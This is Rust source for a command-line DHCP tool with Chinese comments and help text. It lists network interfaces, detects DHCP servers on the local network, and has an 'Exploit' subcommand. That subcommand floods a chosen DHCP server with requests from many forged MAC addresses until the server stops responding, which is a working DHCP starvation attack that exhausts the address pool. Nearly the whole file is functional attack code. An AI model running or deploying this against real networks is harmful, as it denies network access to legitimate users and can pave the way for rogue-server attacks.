use clap::{ArgAction, Parser, Subcommand};
use core::net::Ipv4Addr;
use dhcp_bl::utils::{checksum, mac_to_u8, u16_to_u8, u32_to_u8, u8_to_mac};
use dhcproto::v4::Message;
use dhcproto::{v4, Decodable, Encodable, Encoder};
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, NetworkInterface};
use pnet::packet::ethernet::{EtherType, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocol;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
use pnet::packet::{ipv4::MutableIpv4Packet, Packet};
use pnet::util::MacAddr;
use std::str::FromStr;
use std::time::Instant;

fn build_dhcp_ethernet_packet(
    ip_src: Ipv4Addr,
    ip_dst: Ipv4Addr,
    mac_src: MacAddr,
    mac_dst: MacAddr,
    msg: &Message,
) -> Vec<u8> {
    let mut dhcp_buf = Vec::new();
    let mut e = Encoder::new(&mut dhcp_buf);
    msg.encode(&mut e)
        .expect("encode dhcp discovery msg failed");

    // 构建UDP报文
    let mut udp_buf = vec![0; 8];
    udp_buf.append(&mut dhcp_buf.clone());
    let mut udp_pkg = MutableUdpPacket::new(&mut udp_buf).unwrap();
    udp_pkg.set_source(68);
    udp_pkg.set_destination(67);
    udp_pkg.set_length(udp_pkg.packet().len() as u16);
    // 计算UDP校验和
    let udp_len_u8 = u16_to_u8(&[udp_pkg.get_length()]);
    let udp_fake_header = [
        [ip_src.octets(), ip_dst.octets()].concat().as_slice(),
        &[0x00, 0x11, udp_len_u8[0], udp_len_u8[1]],
    ]
    .concat();
    udp_pkg.set_checksum(checksum(
        [udp_fake_header.as_slice(), udp_pkg.packet()]
            .concat()
            .as_slice(),
    ));
    // dbg!(&udp_pkg);

    // 构建IP报文
    let id: u16 = rand::random();
    let total_length = 20 + udp_pkg.get_length();
    let mut ipv4_buf = vec![0; total_length as usize];
    let mut ipv4_pkg = MutableIpv4Packet::new(&mut ipv4_buf).unwrap();
    ipv4_pkg.set_version(4);
    ipv4_pkg.set_header_length(5);
    ipv4_pkg.set_total_length(total_length);
    ipv4_pkg.set_identification(id);
    ipv4_pkg.set_ttl(128);
    ipv4_pkg.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocol(17));
    ipv4_pkg.set_destination(ip_dst);
    ipv4_pkg.set_source(ip_src);
    ipv4_pkg.set_checksum(checksum(&ipv4_pkg.packet()[..20]));
    ipv4_pkg.set_payload(&udp_buf);
    // dbg!(&ipv4_pkg);

    // Ethernet报文
    let mut eth_buf = vec![0; 14 + ipv4_pkg.get_total_length() as usize];
    let mut ether_packet = MutableEthernetPacket::new(&mut eth_buf).unwrap();
    ether_packet.set_destination(mac_dst);
    ether_packet.set_source(mac_src);
    ether_packet.set_ethertype(EtherType(0x0800));
    ether_packet.set_payload(&ipv4_pkg.packet());
    // dbg!(&ether_packet);
    eth_buf.clone()
}

/**接收DHCP报文，超时时间为timeout_secs秒

*/
fn recive_dhcp_packet(
    rx: &mut Box<dyn DataLinkReceiver>,
    target_server_ip: Ipv4Addr,
    target_server_mac: Option<MacAddr>,
    xid: u32,
    timeout_secs: u64,
) -> Option<Message> {
    let time_instant = Instant::now();
    loop {
        let d = time_instant.elapsed();
        if d.as_secs() > timeout_secs {
            return None;
        }
        match rx.next() {
            Ok(packet) => {
                let eth_packet = EthernetPacket::new(packet).unwrap();
                if !(eth_packet.get_ethertype() == EtherType::new(0x0800)) {
                    continue;
                }
                if let Some(mac_addr) = target_server_mac {
                    if eth_packet.get_source() != mac_addr {
                        continue;
                    }
                }
                let ip_packet = Ipv4Packet::new(eth_packet.payload()).expect("解析IP报文失败");
                if !(ip_packet.get_next_level_protocol() == IpNextHeaderProtocol::new(17)
                    && ip_packet.get_source() == target_server_ip)
                {
                    continue;
                }
                let udp_packet = UdpPacket::new(ip_packet.payload()).expect("解析UDP报文失败");
                if !(udp_packet.get_destination() == 68 && udp_packet.get_source() == 67) {
                    continue;
                }
                let dhcp_msg =
                    v4::Message::from_bytes(udp_packet.payload()).expect("解析DHCP报文失败");
                if !(dhcp_msg.xid() == xid) {
                    continue;
                }
                return Some(dhcp_msg);
            }
            Err(e) => {
                println!("接收报文出现错误: {}", e);
            }
        }
    }
}

fn detect_dhcp_server(
    interface: u32,
    ip_src: Ipv4Addr,
    mac_src: MacAddr,
    ip_dst: Ipv4Addr,
    mac_dst: MacAddr,
    timeout_secs: u64,
) {
    let interface_match = |iface: &NetworkInterface| iface.index == interface;
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .filter(interface_match)
        .next()
        .expect(format!("没有这个接口 {}", interface).as_str());

    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!(
            "An error occurred when creating the datalink channel: {}",
            e
        ),
    };

    // dhcp discovery message
    let client_mac = mac_src.to_string();
    let chaddr = mac_to_u8(&client_mac);
    let mut msg = v4::Message::default();
    msg.set_flags(v4::Flags::default())
        .set_chaddr(&chaddr)
        .opts_mut()
        .insert(v4::DhcpOption::MessageType(v4::MessageType::Discover));
    msg.opts_mut()
        .insert(v4::DhcpOption::Hostname(client_mac.to_string()));
    msg.opts_mut().insert(v4::DhcpOption::RequestedIpAddress(
        Ipv4Addr::from_str("0.0.0.0").unwrap(),
    ));
    msg.opts_mut()
        .insert(v4::DhcpOption::ParameterRequestList(vec![
            v4::OptionCode::SubnetMask,
            v4::OptionCode::Router,
            v4::OptionCode::DomainNameServer,
            v4::OptionCode::DomainName,
            v4::OptionCode::ServerIdentifier,
        ]));
    msg.opts_mut().insert(v4::DhcpOption::ClientIdentifier(
        [&[0x01u8], chaddr.as_slice()].concat(),
    ));
    let xid = msg.xid();
    tx.send_to(
        &build_dhcp_ethernet_packet(ip_src, ip_dst, mac_src, mac_dst, &msg),
        None,
    );

    println!("网络内有以下DHCP服务器：");
    let mut servers = vec![];
    let time_instant = Instant::now();
    let mut resend_flag = false;

    loop {
        let d = time_instant.elapsed();
        if d.as_secs() == timeout_secs / 2 && !resend_flag {
            tx.send_to(
                &build_dhcp_ethernet_packet(ip_src, ip_dst, mac_src, mac_dst, &msg),
                None,
            );
            resend_flag = true;
        }
        if d.as_secs() > timeout_secs {
            break;
        }
        match rx.next() {
            Ok(packet) => {
                let eth_packet = EthernetPacket::new(packet).unwrap();
                if !(eth_packet.get_ethertype() == EtherType::new(0x0800)) {
                    continue;
                }
                let ip_packet = Ipv4Packet::new(eth_packet.payload()).expect("解析IP报文失败");
                if !(ip_packet.get_next_level_protocol() == IpNextHeaderProtocol::new(17)) {
                    continue;
                }
                let udp_packet = UdpPacket::new(ip_packet.payload()).expect("解析UDP报文失败");
                if !(udp_packet.get_destination() == 68 && udp_packet.get_source() == 67) {
                    continue;
                }
                let dhcp_msg =
                    v4::Message::from_bytes(udp_packet.payload()).expect("解析DHCP报文失败");
                if !(dhcp_msg.xid() == xid) {
                    continue;
                }
                if let v4::DhcpOption::ServerIdentifier(ip) = dhcp_msg
                    .opts()
                    .get(v4::OptionCode::ServerIdentifier)
                    .unwrap()
                {
                    if !servers.contains(ip) {
                        servers.push(*ip);
                        println!("DHCP服务器：{}，MAC：{}", ip, eth_packet.get_source());
                    }
                }
            }
            Err(e) => {
                println!("接收报文出现错误: {}", e);
            }
        }
    }
}

fn request_ip_from_dhcp_server(
    interface: u32,
    ip_src: Ipv4Addr,
    mac_src: MacAddr,
    ip_dst: Ipv4Addr,
    mac_dst: MacAddr,
    target_server_ip: Ipv4Addr,
    target_server_mac: Option<MacAddr>,
    timeout_secs: u64,
) -> Option<Ipv4Addr> {
    let interface_match = |iface: &NetworkInterface| iface.index == interface;
    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .filter(interface_match)
        .next()
        .expect(format!("没有这个接口 {}", interface).as_str());
    // Create a new channel, dealing with layer 2 packets
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!(
            "An error occurred when creating the datalink channel: {}",
            e
        ),
    };
    // dhcp discovery
    let client_mac = mac_src.to_string();
    let chaddr = mac_to_u8(&client_mac);
    let mut msg = v4::Message::default();
    msg.set_flags(v4::Flags::default())
        .set_chaddr(&chaddr)
        .opts_mut()
        .insert(v4::DhcpOption::MessageType(v4::MessageType::Discover));
    msg.opts_mut()
        .insert(v4::DhcpOption::Hostname(client_mac.to_string()));
    msg.opts_mut().insert(v4::DhcpOption::RequestedIpAddress(
        Ipv4Addr::from_str("0.0.0.0").unwrap(),
    ));
    msg.opts_mut()
        .insert(v4::DhcpOption::ParameterRequestList(vec![
            v4::OptionCode::SubnetMask,
            v4::OptionCode::Router,
            v4::OptionCode::DomainNameServer,
            v4::OptionCode::DomainName,
            v4::OptionCode::ServerIdentifier,
        ]));
    msg.opts_mut().insert(v4::DhcpOption::ClientIdentifier(
        [&[0x01u8], chaddr.as_slice()].concat(),
    ));
    let xid = msg.xid();
    tx.send_to(
        &build_dhcp_ethernet_packet(ip_src, ip_dst, mac_src, mac_dst, &msg),
        None,
    );

    // dhcp request
    let offer_msg = match recive_dhcp_packet(
        &mut rx,
        target_server_ip,
        target_server_mac,
        xid,
        timeout_secs,
    ) {
        Some(x) => x,
        None => return None,
    };
    let offer_ip = offer_msg.yiaddr();
    let mut request_msg = v4::Message::default();
    request_msg
        .set_htype(v4::HType::Eth)
        .set_xid(xid)
        .set_chaddr(&chaddr);
    request_msg
        .opts_mut()
        .insert(v4::DhcpOption::MessageType(v4::MessageType::Request));
    request_msg
        .opts_mut()
        .insert(v4::DhcpOption::ClientIdentifier(
            [&[0x01u8], chaddr.as_slice()].concat(),
        ));
    request_msg
        .opts_mut()
        .insert(v4::DhcpOption::RequestedIpAddress(offer_ip));
    request_msg
        .opts_mut()
        .insert(v4::DhcpOption::ParameterRequestList(vec![
            v4::OptionCode::SubnetMask,
            v4::OptionCode::Router,
            v4::OptionCode::DomainNameServer,
            v4::OptionCode::DomainName,
            v4::OptionCode::Renewal,
            v4::OptionCode::Rebinding,
            v4::OptionCode::ServerIdentifier,
        ]));
    tx.send_to(
        &build_dhcp_ethernet_packet(ip_src, ip_dst, mac_src, mac_dst, &request_msg),
        None,
    );
    Some(offer_ip)
}

#[derive(Parser)]
#[command(version, about, long_about)]
#[command(propagate_version = true)]
#[command(arg_required_else_help = true)]
#[command(disable_help_flag = true)]
#[command(disable_version_flag = true)]
struct Cli {
    /// 打印帮助信息
    #[arg(short, long, action = ArgAction::Help)]
    help: Option<bool>,

    /// 打印版本
    #[arg(short, long, action = ArgAction::Version)]
    version: Option<bool>,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// 列出系统的网卡
    List {},

    /// 检查网络内有哪些DHCP服务器
    Detect {
        /// 网卡编号（不能使用无线网卡），使用list命令获取网卡编号
        #[arg(short, long, value_name = "INDEX")]
        interface: u32,

        /// 超时时间（秒）
        #[arg(short, long)]
        #[arg(default_value_t = 10)]
        #[arg(value_parser = clap::value_parser!(u64).range(5..))]
        timeout: u64,

        /// 发送报文的源IP
        #[arg(long)]
        #[arg(value_name("IP"))]
        #[arg(default_value_t = String::from("0.0.0.0"))]
        ip_src: String,

        /// 发送报文的源MAC
        #[arg(long)]
        #[arg(value_name("MAC"))]
        #[arg(default_value_t = String::from("00:50:56:00:00:00"))]
        mac_src: String,

        /// 发送报文的目的IP
        #[arg(long)]
        #[arg(value_name("IP"))]
        #[arg(default_value_t = String::from("255.255.255.255"))]
        ip_dst: String,

        /// 发送报文的目的MAC
        #[arg(long)]
        #[arg(value_name("MAC"))]
        #[arg(default_value_t = String::from("ff:ff:ff:ff:ff:ff"))]
        mac_dst: String,
    },

    /// 向指定的DHCP服务器发送指定次数的request请求
    Exploit {
        /// 网卡编号（不能使用无线网卡），使用list命令获取网卡编号
        #[arg(short, long, value_name = "INDEX")]
        interface: u32,

        /// 发送的DHCP请求次数
        #[arg(short, long)]
        #[arg(default_value_t = 256)]
        #[arg(value_name("NUM"))]
        #[arg(value_parser = clap::value_parser!(u32).range(1..))]
        count: u32,

        /// 发送报文源MAC的OUI（MAC地址的前3个字节）
        #[arg(long)]
        #[arg(value_name("MACOUI"))]
        #[arg(default_value_t = String::from("00:50:56"))]
        mac_oui: String,

        /// 发送报文的源IP
        #[arg(long)]
        #[arg(value_name("IP"))]
        #[arg(default_value_t = String::from("0.0.0.0"))]
        ip_src: String,

        /// 发送报文的目的IP
        #[arg(long)]
        #[arg(value_name("IP"))]
        #[arg(default_value_t = String::from("255.255.255.255"))]
        ip_dst: String,

        /// 发送报文的目的MAC
        #[arg(long)]
        #[arg(value_name("MAC"))]
        #[arg(default_value_t = String::from("ff:ff:ff:ff:ff:ff"))]
        mac_dst: String,

        /// 目标DHCP服务器的IP地址
        #[arg(short, long = "server", value_name = "IP")]
        server_ip: String,

        /// 目标DHCP服务器的MAC地址（可不设置）
        #[arg(long = "server-mac", value_name = "MAC")]
        target_server_mac: Option<String>,

        /// 超时时间（秒）
        #[arg(short, long)]
        #[arg(default_value_t = 20)]
        #[arg(value_parser = clap::value_parser!(u64).range(1..))]
        timeout: u64,
    },
}

fn main() {
    let cli = Cli::parse();

    match &cli.command {
        Commands::List {} => {
            for i in datalink::interfaces() {
                println!(
                    "网卡编号:{:2}，IP：{:19}，MAC：{:17}，描述：{}，名称：{}",
                    i.index,
                    i.ips[0].to_string(),
                    i.mac.unwrap().to_string(),
                    i.description,
                    i.name,
                )
            }
        }
        Commands::Detect {
            interface,
            timeout,
            ip_src,
            mac_src,
            ip_dst,
            mac_dst,
        } => {
            detect_dhcp_server(
                *interface,
                Ipv4Addr::from_str(&ip_src).unwrap(),
                MacAddr::from_str(&mac_src).unwrap(),
                Ipv4Addr::from_str(&ip_dst).unwrap(),
                MacAddr::from_str(&mac_dst).unwrap(),
                *timeout,
            );
        }
        Commands::Exploit {
            count,
            mac_oui,
            interface,
            ip_src,
            ip_dst,
            mac_dst,
            server_ip,
            target_server_mac,
            timeout,
        } => {
            let timer = Instant::now();
            for i in 1..=*count {
                let mac_src = MacAddr::from_str(
                    &[mac_oui.to_string(), u8_to_mac(&u32_to_u8(&[i])[1..])].join(":"),
                )
                .unwrap();

                let ip = request_ip_from_dhcp_server(
                    *interface,
                    Ipv4Addr::from_str(&ip_src).unwrap(),
                    mac_src,
                    Ipv4Addr::from_str(&ip_dst).unwrap(),
                    MacAddr::from_str(&mac_dst).unwrap(),
                    Ipv4Addr::from_str(&server_ip).unwrap(),
                    match target_server_mac {
                        Some(x) => Some(MacAddr::from_str(x).unwrap()),
                        None => None,
                    },
                    *timeout,
                );
                match ip {
                    Some(x) => println!("序号：{} MAC地址：{} IP地址：{}", i, mac_src, x),
                    None => {
                        println!("服务器没有响应");
                        break;
                    }
                }
            }
            println!("耗时{}秒", timer.elapsed().as_secs());
        }
    }
}
